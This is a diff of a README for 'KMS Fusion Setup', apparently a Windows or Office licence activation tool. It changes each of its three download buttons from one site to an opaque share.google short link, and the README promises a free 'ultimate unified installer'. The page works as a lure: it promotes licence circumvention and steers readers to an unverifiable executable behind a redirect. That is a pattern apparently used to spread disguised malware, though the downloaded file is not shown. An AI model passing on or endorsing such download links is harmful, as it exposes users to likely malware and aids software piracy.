@@ -9,7 +9,7 @@ The **🔥 KMS Fusion Setup** is the ultimate unified installer that fuses every
 
 <div align="center">
 
-[![Download KMS Fusion Setup](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-fusion-setup)
+[![Download KMS Fusion Setup](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/YUlm9bMm49dukHsBf)
 
 </div>
 
@@ -101,7 +101,7 @@ You need different tools for different tasks. One for activation, another for ba
 4. **✅ Select installation mode** — Single PC or Management Server
 5. **🚀 Launch Fusion Console**
 
-[![Download KMS Fusion Setup](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-fusion-setup)
+[![Download KMS Fusion Setup](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/YUlm9bMm49dukHsBf)
 
 ### Installation Modes
 
@@ -249,7 +249,7 @@ Every tool fused into one. **KMS Fusion Setup** combines local activation, fleet
 
 <div align="center">
 
-[![Download KMS Fusion Setup](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-fusion-setup)
+[![Download KMS Fusion Setup](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/YUlm9bMm49dukHsBf)
 
 **Version 5.0.0** — Ultimate unified installer. Free forever.
 
